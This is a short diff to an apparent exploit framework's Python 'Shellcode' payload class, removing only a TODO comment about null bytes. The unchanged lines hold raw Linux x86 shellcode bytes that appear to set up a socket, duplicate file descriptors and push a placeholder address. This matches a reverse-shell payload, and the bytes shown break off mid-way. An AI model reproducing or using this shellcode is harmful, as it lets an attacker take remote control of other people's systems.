@@ -1,7 +1,6 @@
 from payload_model import Payload
 
 class Shellcode(Payload):
-    #TODO remove null bytes
     def __init__(self):
         shellcode =  b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
         shellcode += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68%s"
